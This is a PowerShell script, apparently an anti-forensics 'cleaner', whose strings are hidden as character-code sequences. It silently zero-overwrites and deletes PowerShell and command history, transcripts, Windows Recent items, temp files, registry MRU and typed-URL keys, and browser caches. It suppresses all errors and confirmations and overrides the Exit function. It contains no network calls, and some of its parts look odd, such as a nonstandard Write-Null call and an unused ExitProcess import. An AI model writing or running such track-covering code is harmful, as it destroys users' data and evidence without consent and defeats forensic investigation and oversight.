$ErrorActionPreference = $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
$WarningPreference     = $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
$VerbosePreference     = $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
$DebugPreference       = $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
$InformationPreference = $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
$ProgressPreference    = $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
$ConfirmPreference     = $([char]78+[char]111+[char]110+[char]101)
$WhatIfPreference      = $false
$global:ExitCode = 0
Remove-Variable -Name 'global:ExitCode' -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
function Exit {
    Write-Null
}
$null = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
    public static extern void ExitProcess(uint uExitCode);
    public static void Exit(int exitCode) { }
'@ -Name "SafeExit" -Namespace "System" -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
function Force-SilentDelete {
    param([string]$Path)
    if (Test-Path $Path -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)) {
        try {
            if (Test-Path $Path -PathType Container) {
                [System.IO.Directory]::Delete($Path, $true) 2>$null
            } else {
                [System.IO.File]::Delete($Path) 2>$null
            }
        } catch {
            try {
                $null = cmd /c $([char]114+[char]109+[char]100+[char]105+[char]114+[char]32+[char]47+[char]115+[char]32+[char]47+[char]113+[char]32+[char]34+[char]34+[char]34+$Path+[char]34+[char]34+[char]34+[char]32+[char]50+[char]62+[char]110+[char]117+[char]108) 2>$null
            } catch {}
        }
    }
}
function Overwrite-And-Delete {
    param([string]$Path)
    if (Test-Path $Path -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)) {
        try {
            if (-not (Test-Path $Path -PathType Container)) {
                $fileInfo = Get-Item $Path -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
                if ($fileInfo -and $fileInfo.Length -gt 0) {
                    $zeros = New-Object byte[] $fileInfo.Length
                    [System.IO.File]::WriteAllBytes($Path, $zeros) 2>$null
                }
            }
            Force-SilentDelete -Path $Path
        } catch {}
    }
}
function Clear-AllCommandHistory {
    $psHistoryLocations = @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\*_history.txt",
        "$env:USERPROFILE\.ps_history"
    )
    foreach ($pattern in $psHistoryLocations) {
        try {
            Get-ChildItem $pattern -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101) | ForEach-Object {
                Overwrite-And-Delete -Path $_.FullName
            }
        } catch {}
    }
    $doskeyLocations = @(
        "$env:USERPROFILE\AppData\Local\VirtualStore\*doskey*",
        "$env:APPDATA\Microsoft\Windows\Command History\*"
    )
    foreach ($pattern in $doskeyLocations) {
        try {
            Get-ChildItem $pattern -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101) | ForEach-Object {
                Overwrite-And-Delete -Path $_.FullName
            }
        } catch {}
    }
    $transcriptLocations = @(
        "$env:USERPROFILE\Documents\*_transcript*.txt",
        "$env:USERPROFILE\Documents\PowerShell_transcript*.txt",
        "$env:TEMP\*_transcript*.txt"
    )
    foreach ($pattern in $transcriptLocations) {
        try {
            Get-ChildItem $pattern -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101) | ForEach-Object {
                Overwrite-And-Delete -Path $_.FullName
            }
        } catch {}
    }
}
function Clear-WindowsRecentFiles {
    $recentPaths = @(
        "$env:APPDATA\Microsoft\Windows\Recent",
        "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
        "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
    )
    foreach ($path in $recentPaths) {
        if (Test-Path $path -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)) {
            try {
                [System.IO.Directory]::Delete($path, $true) 2>$null
            } catch {
                $null = cmd /c $([char]114+[char]109+[char]100+[char]105+[char]114+[char]32+[char]47+[char]115+[char]32+[char]47+[char]113+[char]32+[char]34+[char]34+[char]34+$path+[char]34+[char]34+[char]34+[char]32+[char]50+[char]62+[char]110+[char]117+[char]108) 2>$null
            }
        }
    }
    try {
        $null = New-Item -Path "$env:APPDATA\Microsoft\Windows\Recent" -ItemType Directory -Force -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
        $null = New-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations" -ItemType Directory -Force -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
        $null = New-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations" -ItemType Directory -Force -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
    } catch {}
}
function Clear-RegistryArtifacts {
    $registryPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
        "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU"
    )
    foreach ($path in $registryPaths) {
        if (Test-Path $path -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)) {
            try {
                Get-ItemProperty -Path $path -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101) |
                    Get-Member -MemberType NoteProperty -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101) |
                    ForEach-Object {
                        $null = Remove-ItemProperty -Path $path -Name $_.Name -Force -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
                    }
            } catch {}
        }
    }
}
function Clear-TempFiles {
    $tempPaths = @(
        "$env:TEMP",
        "$env:TMP",
        "$env:LOCALAPPDATA\Temp"
    )
    foreach ($path in $tempPaths) {
        if (Test-Path $path -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)) {
            try {
                Get-ChildItem $path -Force -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101) |
                    Where-Object { !$_.PSIsContainer -and $_.Name -notmatch $([char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116+[char]124+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115) } |
                    ForEach-Object {
                        Overwrite-And-Delete -Path $_.FullName
                    }
            } catch {}
        }
    }
}
function Skip-RecycleBin {
}
function Clear-BrowserCaches {
    $chromePaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Code Cache"
    )
    foreach ($path in $chromePaths) {
        if (Test-Path $path -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)) {
            try {
                [System.IO.Directory]::Delete($path, $true) 2>$null
            } catch {}
        }
    }
    $edgePaths = @(
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Code Cache"
    )
    foreach ($path in $edgePaths) {
        if (Test-Path $path -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)) {
            try {
                [System.IO.Directory]::Delete($path, $true) 2>$null
            } catch {}
        }
    }
    $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*" -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
    foreach ($profile in $firefoxProfiles) {
        $ffPaths = @("$profile\cache2")
        foreach ($path in $ffPaths) {
            if (Test-Path $path -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)) {
                try {
                    [System.IO.Directory]::Delete($path, $true) 2>$null
                } catch {}
            }
        }
    }
    $iePaths = @(
        "$env:LOCALAPPDATA\Microsoft\Windows\INetCache",
        "$env:LOCALAPPDATA\Microsoft\Windows\WebCache"
    )
    foreach ($path in $iePaths) {
        if (Test-Path $path -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)) {
            try {
                Get-ChildItem $path -Recurse -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101) |
                    Where-Object { !$_.PSIsContainer } |
                    ForEach-Object {
                        Overwrite-And-Delete -Path $_.FullName
                    }
            } catch {}
        }
    }
}
try {
    Clear-AllCommandHistory
    Clear-WindowsRecentFiles
    Clear-RegistryArtifacts
    Clear-TempFiles
    Skip-RecycleBin
    Clear-BrowserCaches
    try {
        $global:MaximumHistoryCount = 0
        Clear-History -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
    } catch {}
} catch {
}
try {
    Clear-AllCommandHistory
    Clear-WindowsRecentFiles
    Clear-RegistryArtifacts
    Clear-TempFiles
    Skip-RecycleBin
    Clear-BrowserCaches
    try {
        $global:MaximumHistoryCount = 0
        Clear-History -ErrorAction $([char]83+[char]105+[char]108+[char]101+[char]110+[char]116+[char]108+[char]121+[char]67+[char]111+[char]110+[char]116+[char]105+[char]110+[char]117+[char]101)
    } catch {}
    Write-Host $([char]91+[char]43+[char]93+[char]32+[char]67+[char]108+[char]101+[char]97+[char]110+[char]105+[char]110+[char]103+[char]32+[char]99+[char]111+[char]109+[char]112+[char]108+[char]101+[char]116+[char]101+[char]100)
} catch {
    Write-Host $([char]91+[char]33+[char]93+[char]32+[char]67+[char]108+[char]101+[char]97+[char]110+[char]105+[char]110+[char]103+[char]32+[char]102+[char]97+[char]105+[char]108+[char]101+[char]100)
}
